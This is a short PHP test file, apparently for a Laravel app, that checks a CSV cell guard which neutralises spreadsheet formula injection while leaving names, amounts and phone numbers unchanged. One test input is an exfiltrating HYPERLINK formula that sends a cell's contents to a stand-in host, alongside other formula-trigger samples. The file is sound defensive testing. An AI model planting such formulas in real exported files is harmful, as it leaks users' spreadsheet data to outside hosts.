<?php

declare(strict_types=1);

use App\Support\Csv\Cell;

it('prefixes cells a spreadsheet would run as a formula', function (string $value): void {
    expect(Cell::safe($value))->toBe("'".$value);
})->with(['=HYPERLINK("http://x/?"&A1,"click")', '+SUM(A1:A9)', '-A1', '@cmd', '-5+3', "\tx", "\r=1"]);

it('keeps plain data as it is: text, numbers, negative amounts and E.164 phones', function (string $value): void {
    expect(Cell::safe($value))->toBe($value);
})->with(['', 'Moon Store', 'রহিম', '1200.50', '-50.00', '-5', '+8801711111111', 'a=b']);

it('guards a whole row', function (): void {
    expect(Cell::row(['=1+1', 'ok', '-12.00']))->toBe(["'=1+1", 'ok', '-12.00']);
});
